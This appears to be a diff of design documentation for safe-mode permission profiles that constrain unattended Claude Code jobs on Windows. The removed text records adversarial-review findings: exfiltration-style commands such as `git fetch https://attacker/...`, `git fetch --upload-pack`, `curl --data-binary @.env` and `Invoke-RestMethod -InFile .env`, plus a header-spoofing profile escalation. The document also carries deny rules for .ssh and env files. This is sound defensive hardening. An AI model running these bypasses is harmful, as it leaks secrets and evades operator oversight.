@@ -511,247 +511,116 @@ configuration and the rollout checklist: `docs/container-jobs.md`. Operational n
   (outstanding tokens die within the hour), delete its private key, and revoke the setup-token for a
   full cut-off. See the doc's "Rollback".
 
-## Safe-mode job profiles (`feat/safe-mode-profiles-v2`, 2026-11-09 through 2026-11-13)
+## Safe-mode job profiles (owner scope decision, 2026-11-13)
 
-**Decision A (what "safe mode" actually is).** `readonly`/`code` below are a HOST-SIDE Claude Code
-tool allowlist -- accident protection, not a sandbox. Native Windows has no OS-level filesystem or
-network sandbox for a process: a "code" job (or "readonly", if it ever gets to run `node`/`python`
-through some other path) can read any file and reach any network endpoint that process is capable
-of, regardless of what `permissions.allow`/`deny` say, because those lists only gate the Claude Code
-TOOL surface (the Read tool, the Edit tool, a Bash/PowerShell command-prefix match) -- never the
-underlying OS. `readonly` is documented, and tested, only as "a tight allowlist of specific tools and
-wrapper scripts that in practice never issue a write or a network call outside a fixed set" -- never
-as "this job cannot write a file" or "this job cannot exfiltrate data," because on native Windows
-that guarantee does not exist for a process that can invoke an interpreter. Untrusted work (a prompt
-from outside, a dependency you haven't reviewed, anything you would not hand write/shell access to
-directly) belongs in a container job (`sandbox:"container"`) with its own scoped GitHub App
-credentials, repo clone, and network -- and even a container is not BY ITSELF a confidentiality or
-read-only guarantee (see docs/container-jobs.md's own caveats on what the container boundary does
-and does not cover).
+Both profiles are **accident protection on native Windows**, not security boundaries.
+Neither profile contains a hostile job or protects secrets in the working tree or environment
+from one. Use container jobs for untrusted work, with deliberately limited credentials, mounts
+and network. A separate Windows account is a future boundary, not part of this PR. Containers
+also need explicit configuration; they are not automatically confidential or read-only.
 
-**Decision B (`ops` was removed).** An earlier draft of this feature (2026-11-09/2026-11-12) added a
-third profile, `ops`, backed by a dedicated runner (a fixed registry of two named operational
-actions: `hostapi-restart`, `agentglass-update-restart`). Two adversarial reviews (2026-11-13) found
-it unsound as designed: it had no server-held job identity (anyone able to set
-`CLAUDE_ASYNC_JOB_PROFILE=ops` in a process's own environment satisfies its one self-check), no
-hardcoded action config (`AGENTGLASS_*` env vars reached straight into `execFile`/`spawnSync` calls),
-audit storage inside the job's own write access (so a job could tamper with its own audit trail), and
-string interpolation into a PowerShell `-Command` (a real injection surface). `ops` and
-its runner were removed from this PR. **`guard.mjs`'s
-`PROFILES` is exactly `["readonly", "code"]`; a request for `profile: "ops"` is refused explicitly**
-(`checkProfile`'s `invalid profile` error), never silently mapped to `code` or to anything else. The
-`ops` runner will be redesigned later with server-held job identity, hardcoded action config, audit
-storage outside job write access, and no string interpolation into `powershell -Command` -- none of
-that design work happened in this PR.
+| Profile | Intended ordinary use |
+|---|---|
+| readonly | Read/Glob/Grep/WebSearch, selected PowerShell inspection cmdlets, exact version/auth-status checks, and three fixed helpers. No editing tools, general interpreter grant, raw Git or raw HTTP. |
+| code (default) | Historical coding permissions: editing tools, interpreters, raw Git and developer runners, with accidental destructive-operation guards. Project and local approvals can widen a code job. |
 
-**Decision C (`readonly` is a tool allowlist, not a sandbox -- restated for the specific claims this
-PR's tests actually demonstrate).** Every claim below about what `readonly` "does" is bounded by
-what a test in this PR actually exercises (see "Tests" in the PR description) -- this section is not
-a broader security guarantee than that.
+Both profiles allow WebSearch and therefore have network egress. gh auth status contacts GitHub;
+it is not just a version check. Ollama generation uses a local service. Neither profile is an
+egress filter. Standalone ollama list and ollama ps remain subject to the Ollama guard.
 
-By default every claude-async job runs with `--dangerously-skip-permissions` — unattended `-p` runs
-have no one to answer a permission prompt, so this has always been the hardcoded default.
-`CLAUDE_ASYNC_JOB_SAFE_PERMISSIONS=1` (or `opts.safePermissions`/`startOptions.safePermissions` in
-tests) switches that to `--permission-mode dontAsk`, Claude Code's own headless mode: it honors
-`permissions.allow`/`permissions.deny` and auto-denies anything that matches neither. The allow/deny
-lists are built per-job by `job-core.mjs`'s `buildSafePermissionsSettings(profile)`, scoped by one of
-TWO **profiles** (`guard.mjs`'s `PROFILES`):
+### Settings and hooks
 
-| Profile | Gets | Does NOT get |
-|---|---|---|
-| `readonly` | `Read`/`Glob`/`Grep`/`WebSearch`; the `tools/git-ro.mjs` wrapper (a tight per-subcommand flag allowlist covering `status`/`diff`/`log`/`show`/`rev-parse`/`describe`/`ls-files`/`branch list`/`remote -v`/`worktree list` -- see "Read-only git wrapper" below for why raw `git` prefixes, even read-only-looking ones, cannot be allow-listed safely at all); the read-only PowerShell cmdlets and version-only `gh`/`claude` checks below; the loopback GET helper; and the `tools/ollama-generate.mjs` wrapper | `Edit`/`Write`/`MultiEdit`/`NotebookEdit`, any interpreter or code runner (`node`, `python`, `npm`, `pytest`, `uv`, `mkdir`), and ANY raw `git` subcommand (not just mutating ones) |
-| `code` (**default**, matches the only profile that existed before this feature) | everything `readonly` has, plus file editing, the dev-tool runners, and RAW git -- both the read-only subcommands (`status`, `diff`, `log`, `show`, `rev-parse`, `describe`, `fetch`, `ls-files`, `branch` (bare/`--list`), `worktree list`, `remote`) and the write-capable ones (`add`, `commit`, `checkout`, `worktree add/remove`, `switch`, `branch <name>`, `remote add/remove`) | — |
+Readonly launches use the supported --setting-sources "" option to exclude **user, project and
+local settings**. Their generated settings explicitly deny Edit, Write, MultiEdit, NotebookEdit,
+ScheduleWakeup and ReportFindings (the latter two persist scheduled/review state in the tested
+2.1.325 inventory). The operator's user hooks object is copied from CLAUDE_CONFIG_DIR/settings.json,
+or ~/.claude/settings.json, into the job settings. No user permissions, environment settings
+or project hooks are imported by that copy. Invalid user hook JSON fails rather than silently
+dropping telemetry.
 
-A "code" job can already run arbitrary `node`/`python` (decision A), so `tools/git-ro.mjs`'s
-validation buys nothing there -- it keeps raw git, unchanged from before this PR. `readonly` **must**
-be requested with `CLAUDE_ASYNC_JOB_SAFE_PERMISSIONS=1` on `sandbox:"host"`, or `startJob()` refuses
-the request outright (errorCode `"profile"`) rather than silently running it unrestricted -- see
-"Refuse, never downgrade" below.
+This preserves the AgentGlass event hooks currently configured in user settings, alongside the
+per-job no-background and Ollama hooks generated by buildNoBackgroundHookSettings. Optional
+job-tool-gate wiring remains as before. User hooks are trusted operator code, not a security
+boundary. Tests use a marker hook, never live AgentGlass. Code settings-source behavior is
+unchanged. Managed CLI policy still applies.
 
-The **deny floor is identical across both profiles** and never loosens per profile — it is the
-belt to the gate hook's suspenders (see "No-background enforcement hook" above for the same
-relationship): destructive git forms (`push`, `merge`, `rebase`, `reset --hard`, `clean -f`, forced
-branch/checkout/switch variants, and — 2026-11-13 accident guards — `git worktree remove --force|-f`
-and `git checkout --force`), edits to `CLAUDE.md`/`hooks/**`/`.claude/settings*.json`/
-`config.yaml`/`scheduled-tasks/**`/`.git/**`/the live chassis (`//**/claunker/**`), and reads of
-`.ssh/**` or anything shaped like an env file.
+References: [CLI setting sources](https://code.claude.com/docs/en/cli-reference) and
+[settings merging](https://code.claude.com/docs/en/settings). Repeat live checks on CLI upgrades.
 
-**Read-only git wrapper (`tools/git-ro.mjs`, 2026-11-13 fix 1).** A second adversarial review found
-that EVERY raw `git ...` allow rule -- including ones that look read-only -- admits a write or an
-exfiltration path a Claude Code prefix rule cannot express: `git log -1 --output=file` / `git diff
---output=file` / `git show REV:path --output=file` (writes a file), `git fetch --upload-pack="cmd" .`
-(runs an arbitrary local command as a fake "server"), `git fetch https://attacker/...` /
-`git fetch . HEAD:refs/heads/x` (exfiltrates / mutates refs), `git diff --no-index NUL <any file>`
-(reads an arbitrary file, including outside the repo, regardless of tracking state), `git diff
---ext-diff` / `git log -p --textconv` (runs an arbitrary external diff/textconv command). Git also
-accepts ABBREVIATED long options in many places, so even denying the literal string `--output` would
-not catch `--out`. `readonly` therefore gets NO raw `git` allow rule at all, only
-`tools/git-ro.mjs`: a fixed per-subcommand git invocation (`status`/`diff`/`log`/`show`/
-`rev-parse`/`describe`/`ls-files`/`branch list`/`remote -v`/`worktree list`), every caller-supplied
-flag checked by EXACT STRING EQUALITY against a small per-subcommand allowlist (never a prefix or
-blocklist match), and every pathspec/revision/`REV:path` argument checked for secret-shaped names
-(`.env`, `*.env`, `.env.*`, anything under `.ssh/`) and containment inside the repo root (no absolute
-path, no `..` escape). Runs via `execFile` (no shell), with `-c core.fsmonitor=false`, `--no-pager`,
-and (diff/log/show) `--no-ext-diff`/`--no-textconv` always appended, `GIT_PAGER=cat`,
-`GIT_TERMINAL_PROMPT=0`, and `GIT_EXTERNAL_DIFF` deleted outright (NOT set to `""` -- that actually
-BREAKS diff: git tries to spawn the empty string as the external diff program and dies; confirmed
-while writing this wrapper's own tests). Honesty: a secret already committed into git history can
-still appear in this wrapper's own output (e.g. a broad `log -p` that touches a commit that once
-added, then removed, a secret file) -- the pathspec/`REV:path` checks stop a DIRECT read of a secret
-PATH, they cannot scrub an already-committed blob's content out of a diff/log that legitimately
-includes it. A `readonly` review should not be pointed at a repo with committed secrets.
+### Git inspection
 
-**Env-file deny (anchored for nested directories too):** `Read(//**/.env)`, `Read(//**/*.env)`,
-`Read(//**/.env.*)` — covers the bare filename, `*.env`-suffixed names (`prod.env`), and
-`.env.`-prefixed names (`.env.local`), each matching at any depth (`sub/.env` is denied exactly like
-`.env`).
+tools/git-ro.mjs accepts log, show, diff **between two named commit revisions**, rev-parse,
+branch list, remote -v, worktree list, and ls-files --cached. The last four list metadata/index
+names; not all output comes from committed objects. It refuses status, describe, worktree/index
+diffs, ls-files --others/--ignored/--stage and index-object shorthand. Both diff operands are
+verified and replaced with commit IDs. The cwd must be inside a Git worktree, preventing the
+previous implicit no-index comparison from a non-repository folder.
 
-**The shell secret-read hole (ITEM 2, and its 2026-11-13 follow-up, fix 3).** The three `Read(...)`
-denies above only bind the Claude Code `Read` tool — they have no effect on a PowerShell
-`Get-Content .env` call, which is a completely different permission surface (a Bash/PowerShell
-command-prefix match, not a file-path check). Before ITEM 2's fix, `PowerShell(Get-Content *)` was
-unconditionally allow-listed, so any safe-mode job could read a secret file's contents straight past
-the `Read`-tool deny; fixed by removing that allow rule entirely. A second adversarial review
-(2026-11-13) found the SAME class of hole still open one level down: `PowerShell(Get-Item *)` /
-`PowerShell(Get-ChildItem *)` were kept on the (correct, at the time) theory that they only return
-metadata -- but `Get-Item Env:NAME` and `Get-ChildItem Env:` print environment variable VALUES,
-including secrets, which is exactly the kind of content these two rules were never meant to leak.
-Both are now removed from every profile too (`Glob`/`Read` already cover directory listing and file
-metadata for a safe-mode job; neither can print an environment variable's value). No remaining
-allow rule in any profile can print a file's contents or an environment variable's value outside
-the `Read` tool's own deny rules.
+The child environment is built from selected OS/search-path variables. Inherited GIT_* controls
+are excluded case-insensitively; terminal prompting, lazy fetch and optional locks are disabled.
+External diff, textconv, pager and fsmonitor suppression remain. Every execution error is nonzero;
+maximum-buffer errors report truncated output. Timeout is per Git subprocess, not one total
+deadline for preflight and execution.
 
-**Word-boundary fix.** Several existing git rules (`git status*`, `git diff*`, `git log*`, `git
-show*`, `git rev-parse*`, `git describe*`, `git ls-files*`) had no space before the trailing `*`,
-which Claude Code's own docs call out as boundary-unsafe (`Bash(ls *)`, with a space, is the
-documented-safe form — a no-space prefix can also match an unrelated command sharing the same text,
-e.g. `lsof` for a bare `ls*`). Simply inserting the space would instead break the extremely common
-bare-command case (`git status` with no arguments would stop matching `git status *`, which requires
-a literal trailing space). Each of these is now listed **twice**: once as an exact string (matches
-the bare command only) and once with a trailing `" *"` (matches the command plus arguments) — both
-boundary-safe, together covering both shapes. These RAW rules are "code" only as of fix 1 above
-(`readonly` reaches the same read-only subcommands only through `tools/git-ro.mjs`).
+**Git access is not secret-aware.** It can show anything in history or objects, including env
+files selected indirectly or by object ID. Literal secret-name and lexical-path refusals are
+courtesy checks only. Repository/global configuration, includes, object stores, filesystem links
+and executable lookup remain trusted; this PR does not contain hostile checkouts. Marker fixtures
+exercise the previous clean-filter, index-hook and promisor-SSH cases for remaining commands,
+not every possible Git configuration feature.
 
-**Read-only PowerShell cmdlets and version checks (ITEM 1).** The 2026-11-09 denial tally found these
-badly underprovisioned — three cmdlets alone accounted for several of the denials it tallied. Every
-profile now allow-lists (exact command and `" *"`-suffixed form, each): `Get-ScheduledTask`,
-`Get-ScheduledTaskInfo`, `Get-NetTCPConnection`, `Get-CimInstance`, `Get-Process`, `Get-Service`,
-`Test-Path`, `Get-Date`, `Get-FileHash`, `Resolve-Path` (`Get-ChildItem`/`Get-Item` were removed
-again in the 2026-11-13 round -- see "shell secret-read hole" above); plus the exact strings
-`gh --version`, `gh auth status`, `claude --version` (exact only, never a prefix, so a chained
-`gh pr create` riding along a `gh --version &&` can't sneak through — Claude Code decomposes a
-`&&`-joined command and denies the whole call if any sub-command isn't covered).
+### Helpers, cmdlets and file reads
 
-**Loopback GET helper (ITEM 1 / fix 6), every profile.** `tools/http-get-loopback.mjs` is the one
-HTTP escape hatch every profile gets: `node <path-to-it> *`, both path-separator spellings, both
-shells. A bare `Invoke-WebRequest`/`curl` allow rule scoped to "loopback" can't actually express that
-restriction (a prefix rule matches literal argv text, not what the URL resolves to, and can't pin
-the HTTP method), so this is a fixed, validated script instead. As of the 2026-11-13 round it also
-only GETs an EXPLICIT `(port, path)` ALLOWLIST (`ALLOWED_TARGETS`), not just "any loopback URL":
-`{7842, "/healthz"}` (claude-async-http.mjs's real route, verified in `http-bridge.mjs`'s
-`createHttpApp()`) and `{11434, "/api/tags"}` / `{11434, "/api/ps"}` (Ollama's own
-model-list/running-process endpoints; Ollama is external to this repo, so these are verified against
-Ollama's documented HTTP API, not this repo's own source). **`host-api.mjs` was asked for here too
-but is NOT in the allowlist**: it has no health/status route of its own at all (every route needs a
-bearer token this script deliberately never sends), and it does not listen on port 4000 by anything
-in this repo's source -- its port is `api.json`-configured, default 7850. Port 4000 matches nothing
-in this repo; see the PR report for this discrepancy. Other hardening: refuses userinfo, a query
-string/fragment, or any hostname other than the literal `127.0.0.1` (no DNS/hosts-file dependence --
-the actual TCP connection is always made to that literal address, never a hostname lookup, even
-though the URL text was already checked); never auto-follows a redirect off the allowlist; ABORTS
-(not merely truncates) the response the instant the 64 KB byte cap is hit; bounds every hop (at most
-3 redirects) under ONE absolute deadline, not reset per hop. The forward-slash main-module bug (the
-script used to exit 0 with NO output when invoked with a forward-slash path, because
-`process.argv[1] === fileURLToPath(...)` never matches a forward-slash argv against
-`fileURLToPath`'s backslash-style absolute path) is fixed with `path.resolve()` on both sides.
+tools/http-get-loopback.mjs only GETs http://127.0.0.1:7842/healthz and follows **no redirects**.
+Ollama tags/ps targets were removed so its allowlist agrees with the Ollama guard; standalone
+ollama list / ollama ps remain available. Both HTTP helpers use absolute timers that destroy
+active requests/responses and clear on completion. Byte-cap exits also close streams. Trickle
+tests assert socket closure and child-process exit.
 
-**Ollama delegation wrapper (`tools/ollama-generate.mjs`, fix 2), every profile.** Replaces every
-raw curl/Invoke-RestMethod/Invoke-WebRequest Ollama allow rule — a second adversarial review
-(2026-11-13) demonstrated `curl ... -o file`, `curl ... --proxy host --data-binary @.env`, a second
-`file:///` URL appended to an allowed call, `Invoke-WebRequest ... -OutFile`, and
-`Invoke-RestMethod ... -InFile .env` all passed BOTH the old static allow rule's prefix match AND
-`hooks/ollama-guard-hook.mjs` (the belt-and-suspenders hook meant to close exactly this gap). The
-wrapper instead takes only `--model`/`--prompt`/`--system`/`--format` as named arguments (no file
-input, no file output, no proxy, no caller-supplied URL at all), POSTs to a fixed destination
-(127.0.0.1:11434/api/generate, connecting to the literal IP, never a hostname lookup) via `node:http`
-directly (which never consults `HTTP_PROXY`/`HTTPS_PROXY` on its own), and bounds the response with
-an absolute deadline and a byte cap it ABORTS on rather than merely truncates. `ollama list`/
-`ollama ps` (the bare CLI, which has no URL of its own to smuggle a bypass into) are kept as their
-own allow rule, now correctly word-boundary-safe (`"ollama list"`/`"ollama list *"`/`"ollama ps"`/
-`"ollama ps *"` — the OLD rule's `.map(p => p + "*")` pass produced boundary-UNSAFE `"ollama
-list*"`/`"ollama ps*"` because it was applied uniformly to every entry in the old allow array
-regardless of whether that entry's string already ended in a space). The Ollama guard passes the repository helper with named arguments and the standalone
-`ollama list` and `ollama ps` commands. It denies raw curl and PowerShell HTTP calls that mention Ollama.
+tools/ollama-generate.mjs accepts only model/prompt/system/format arguments and builds a fresh
+JSON object for fixed loopback /api/generate. Models are configured in tools/local-models.mjs,
+defaulting to qwen2.5-coder:7b and qwen3:8b. Other names, including cloud-suffixed names, are
+rejected. An operator-controlled daemon is assumed: a name does not attest to daemon behavior.
 
-**Nested-profile accident guard, fixed for cross-host dispatch (fix 5).** Same shape as the existing
-dispatch-depth guard (`CLAUDE_ASYNC_DEPTH`): a nested job (one a running job itself dispatches,
-`depth > 0`) cannot request a profile broader than its parent's. Enforced by `guard.mjs`'s
-`checkProfile()`, called from `startJob()` before anything is written to disk. A 2026-11-13
-adversarial review found that `host-api.mjs`'s POST `/v1/start` (the cross-host, Tailscale-routed
-path) resolved "the parent's profile" from the HOST-API DAEMON's own `process.env` — which never
-carries any individual request's real caller's profile, since the daemon is a long-running service,
-not relaunched per job. A `"readonly"` parent could therefore get a `"code"` child by simply
-self-reporting a plausible `X-Claude-Async-Depth` header: the daemon's own env has no
-`CLAUDE_ASYNC_JOB_PROFILE` set, so `checkProfile()` silently assumed the parent was `DEFAULT_PROFILE`
-(`"code"`) and let the escalation through. Fixed by adding two more self-reported headers
-(`PROFILE_HEADER`/`JOB_ID_HEADER`, mirroring `DEPTH_HEADER`'s same accident-guard caveat — a
-determined caller can still misreport any of them) AND an AUTHORITATIVE lookup: `host-api.mjs` now
-reads the parent's REAL recorded profile from that job's own `meta.json` (`job-core.mjs`'s
-`readJobProfile()`) when `JOB_ID_HEADER` names a real job on the receiving host, and only falls back
-to the self-reported `PROFILE_HEADER` (or `DEFAULT_PROFILE`) when it doesn't resolve. `startJob()`
-gained a `profileEnv` opts seam so `checkProfile()` reads THIS resolved value instead of
-unconditionally reading `process.env`. `CLAUDE_ASYNC_JOB_PROFILE` is also no longer forwarded into a
-container's own env (`container.mjs`'s `FORWARDED_ENV_KEYS`) — nothing inside a container ever reads
-it (a container runs the bare `claude` CLI, not this repo's own `dispatch.mjs`/`guard.mjs`), so
-forwarding it bought nothing but the appearance of a guard not actually wired to anything.
+Readonly retains Get-ScheduledTask, Get-ScheduledTaskInfo, Get-NetTCPConnection, Get-Process,
+Get-Service, Test-Path, Get-Date, Get-FileHash and Resolve-Path, subject to CLI argument checks.
+Get-CimInstance remains in code but was removed from readonly after the real CLI returned
+Win32_Environment TEMP values. Get-Content/Get-Item/Get-ChildItem are not granted. These are
+accident guards, not confidentiality protection for process/environment data.
 
-**Refuse, never downgrade (fix 4).** `"readonly"` only means anything under
-`--permission-mode dontAsk` on the HOST — a container job always runs the CLI inside the container
-with `--dangerously-skip-permissions` (the Docker container is the sandbox boundary there, not the
-permission profile), and a host job with safe permissions off also runs with
-`--dangerously-skip-permissions`. `startJob()` therefore REFUSES a `"readonly"` request outright
-(errorCode `"profile"`) when `sandbox:"container"` or safe permissions are off, rather than silently
-launching it as an unrestricted job — the caller asked for a specific guarantee this launch
-configuration cannot provide, and running it anyway under a DIFFERENT, more permissive
-configuration would be worse than refusing. This also guarantees `meta.json` can never record
-`profile:"readonly"` for a `--dangerously-skip-permissions` job: the refusal happens before the
-container preflight or the job dir is ever created, so there is no code path from a refused request
-to that meta.json write.
+Read denies provide courtesy protection for .ssh/** and env-shaped names. Literal-colon
+patterns did **not** block .env::$DATA in CLI 2.1.325. Conservative patterns
+Read(//**/.env*) and Read(//**/*.env*) blocked the alias through both Read and Grep in real-CLI
+tests. They also deny names such as .environment and example.envnotes: an intentional
+conservative tradeoff. This does not establish coverage of all Windows aliases or arbitrary secrets.
 
-**Denial guidance in job prompts (ITEM 4).** The 2026-11-09 denial tally found jobs giving up after
-one denied call instead of retrying with a differently-shaped command, or reporting the denial and
-moving on — the CLI's own generic "don't ask mode" refusal text doesn't say *why* a call was denied
-or what to do about it. When safe permissions are on, `startJob()` appends (`--append-system-prompt`,
-additive to the CLI's own system prompt) a short block naming the active profile and saying plainly:
-a denial is not transient, do not retry the same command or look for a workaround, and if the task
-genuinely needs a capability the profile doesn't grant, stop and say so in the final report with the
-exact denial text. A `--dangerously-skip-permissions` job's prompt is unchanged — the block is only
-added when a job can actually be denied in the first place.
+### Nested jobs, refusals and retired ops
 
-**Container-job interaction.** `profile` is still validated and recorded in `meta.json` for a
-`sandbox:"container"` job, but as of fix 4 `"readonly"` is REFUSED for a container job outright (see
-above) and `CLAUDE_ASYNC_JOB_PROFILE` is no longer forwarded into the container's own env (see fix 5
-above). `buildSafePermissionsSettings()` is **never** consulted on the container path —
-`container.mjs`'s `buildContainerCliArgv()` always runs the CLI inside the container with
-`--dangerously-skip-permissions`; the Docker container itself is the sandbox boundary there, not the
-permission profile (decision A). A container job's profile has no effect on what it can do inside
-the container.
+Nested dispatch is an **accident guard, not authorization**. At depth greater than zero, a missing
+parent record is rejected; a profile header cannot substitute for it. Cross-host nested requests
+are rejected when the receiving host cannot resolve the parent record. Local production dispatch
+resolves its parent job ID to the local record. A known parent cannot request a broader profile.
+Depth/job identity remain self-reported, so a hostile caller can lie.
 
-**Using it.** `claude_start`'s `profile` param (`"readonly"` | `"code"` default) only matters when
-`CLAUDE_ASYNC_JOB_SAFE_PERMISSIONS=1` on `sandbox:"host"`; `"readonly"` is refused outright otherwise
-(fix 4). `"ops"` is refused explicitly (decision B) -- not implemented in this PR. Same validation
-for `host-api.mjs`'s `/v1/start` body field (checked against `guard.mjs`'s `PROFILES`, 400 on an
-unrecognized value).
+Readonly is refused with safe permissions off or sandbox:"container"; it is never intentionally
+launched with skip-permissions. Task Scheduler/breakaway paths use the same serialized arguments.
+Ops and its runner are removed. Public validation rejects ops, and internal settings/guidance
+builders throw for unknown profiles.
 
-**Known residual gaps**, same shape as the ones the 2026-10-21 rehearsal already documented and left
-open: flag-order variants prefix matching can't express (`git branch -fd`, `--force --delete`
-reversed, in "code"'s raw git); `git remote` (bare, listing) is read-only-safe, but "code"'s broader
-`git remote *` (needed for `remote add`) also admits `remote remove`/`set-url`, unchanged from
-before this profile split. `tools/git-ro.mjs`'s own residual gap: its secret-pattern/containment
-checks guard pathspecs and `REV:path` arguments, not a committed blob's CONTENT (see "Read-only git
-wrapper" above). Verification of every check above against a real `claude` process
-is tracked separately (see the PR report's VERIFIED/ESTABLISHED/UNTESTED lists) — this document
-describes the design, not by itself a live-tested guarantee for every claim.
+### Reproducing evidence
+
+Run: node scripts/live-check.mjs <worktree> <results-directory>
+
+The harness drives the installed CLI using a local mock Messages API, isolated config, hostile
+local/user approvals and fake secrets. The three real helpers are invoked; a **test-only** Node
+preload redirects helper HTTP to an ephemeral recorder, never live bridge/Ollama. This tests
+permission/hook composition, not production service endpoints. Code fetch uses a local bare
+remote and asserts the remote-tracking ref advances to a known new commit.
+
+Direct helper tests use ephemeral servers and Git markers. Profile/API tests capture launch
+arguments or use fake launches, not real scheduled jobs. Live AgentGlass delivery, Task Scheduler/
+breakaway deployment, managed-policy combinations and arbitrary hostile configuration remain
+untested by this harness. See the PR evidence report for counts and existing suite failures.
 
 ## Dispatch defaults (model + effort)
 
